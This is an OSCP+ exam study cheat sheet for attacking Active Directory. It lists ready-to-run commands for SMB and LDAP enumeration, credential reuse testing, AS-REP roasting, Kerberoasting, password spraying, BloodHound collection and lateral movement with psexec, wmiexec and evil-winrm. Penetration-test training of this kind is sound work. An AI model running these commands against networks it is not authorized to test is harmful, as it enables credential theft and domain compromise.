# Active Directory Attack Flow

## Purpose

This file is the decision-making guide for attacking Active Directory environments during the OSCP+ exam.

Core rules:

* Enumerate before exploiting
* Reuse credentials across all services
* Validate every finding
* Prefer simple, reliable attack paths over complex chains
* Document each step as you go

---

## 0. Quick AD Indicators

You are likely in AD if you see:

* Kerberos (88)
* LDAP (389 / 636)
* SMB (445)
* RPC (135)
* DNS (53)
* WinRM (5985/5986)
* Domain-style hostnames

Mental model:

* Credentials = access
* Small misconfigs chain into full compromise

---

## 1. Initial Capture (DO THIS IMMEDIATELY)

* Domain:
* FQDN:
* DC IP:
* Hosts:
* Users:
* Passwords:
* Hashes:
* Shares:
* SPNs:
* Sessions:
* Groups:
* Admin candidates:

---

## 2. Host/DNS Setup

```bash
echo "<IP> dc.domain.local dc" | sudo tee -a /etc/hosts
```

Check:

```bash
nslookup domain.local <DC_IP>
```

If Kerberos fails → check:

* DNS
* Time sync
* Domain spelling

---

## 3. Initial Enumeration

## 3.1 Nmap

```bash
nmap -sC -sV -Pn -p 53,88,135,139,389,445,464,593,636,3268,5985 <IP>
```

```bash
nmap -Pn -p- --min-rate 1000 <IP>
```

Look for:

* domain names
* LDAP info
* WinRM
* SMB signing

---

## 3.2 SMB Enumeration

```bash
smbclient -L //<IP> -N
smbmap -H <IP>
enum4linux -a <IP>
```

With creds:

```bash
smbclient -L //<IP> -U 'DOMAIN\user%pass'
crackmapexec smb <IP> -u user -p pass -d DOMAIN
```

Look for:

* SYSVOL / NETLOGON
* scripts
* backups
* config files
* credentials

---

## 3.3 LDAP Enumeration

```bash
ldapsearch -x -H ldap://<IP> -s base namingcontexts
```

```bash
ldapsearch -x -H ldap://<IP> -b "DC=domain,DC=local"
```

With creds:

```bash
ldapsearch -x -H ldap://<IP> -D 'DOMAIN\user' -w 'pass' -b "DC=domain,DC=local"
```

Look for:

* users
* groups
* SPNs
* descriptions (passwords!)
* service accounts

---

## 3.4 User Enumeration

Sources:

* SMB files
* LDAP
* emails
* scripts
* web apps

Build:

* clean user list

---

## 4. Credential Validation (CRITICAL)

Test EVERY credential everywhere.

```bash
crackmapexec smb <targets.txt> -u user -p pass -d DOMAIN
crackmapexec winrm <targets.txt> -u user -p pass -d DOMAIN
crackmapexec rdp <targets.txt> -u user -p pass -d DOMAIN
crackmapexec mssql <targets.txt> -u user -p pass -d DOMAIN
crackmapexec ldap <targets.txt> -u user -p pass -d DOMAIN
```

```bash
evil-winrm -i <IP> -u user -p pass
```

Rule:

* Never test creds in only one place

---

## 5. Kerberos Attacks

## 5.1 AS-REP Roasting

```bash
GetNPUsers.py DOMAIN.LOCAL/ -dc-ip <DC_IP> -usersfile users.txt -no-pass
```

With creds:

```bash
GetNPUsers.py DOMAIN.LOCAL/user:pass -dc-ip <DC_IP> -request
```

Action:

* crack hashes
* reuse creds

---

## 5.2 Kerberoasting

```bash
GetUserSPNs.py DOMAIN.LOCAL/user:pass -dc-ip <DC_IP> -request
```

With hashes:

```bash
GetUserSPNs.py DOMAIN.LOCAL/user -hashes <LM:NT> -dc-ip <DC_IP> -request
```

Action:

* crack hashes
* reuse creds

---

## 5.3 Password Spraying

```bash
crackmapexec smb <targets.txt> -u users.txt -p 'Password123' -d DOMAIN
```

Use carefully:

* avoid lockouts

---

## 6. BloodHound

```bash
bloodhound-python -u user -p pass -ns <DC_IP> -d domain.local -c All
```

Look for:

* shortest path to DA
* local admin rights
* ACL abuse
* session access

---

## 7. Lateral Movement

With creds:

### WinRM

```bash
evil-winrm -i <IP> -u user -p pass
```

### SMB exec

```bash
psexec.py DOMAIN/user:pass@<IP>
```

### WMI

```bash
wmiexec.py DOMAIN/user:pass@<IP>
```

---

## 8. Privilege Escalation (AD Context)

Look for:

* local admin rights
* token impersonation
* service misconfigs
* scheduled tasks
* writable shares
* credential reuse

---

## 9. Looting

Collect:

* creds
* hashes
* tokens
* config files

Store everything.

---

## 10. Common Attack Paths

Typical chains:

* SMB → creds → WinRM → privesc
* LDAP → users → AS-REP → creds → reuse
* Kerberoast → crack → admin account
* Share → config → creds → lateral move
* BloodHound → ACL abuse → escalation

---

## 11. If Stuck

RESET:

* Re-enumerate SMB
* Re-check LDAP
* Re-run BloodHound
* Re-test creds
* Look for new users
* Check internal services

---

## 12. Mental Model

* Credentials unlock everything
* Reuse beats exploitation
* Enumeration finds the path
* Simplicity wins

---

## 13. Golden Rules

* Always enumerate before attacking
* Always reuse credentials
* Always verify findings
* Always document your path
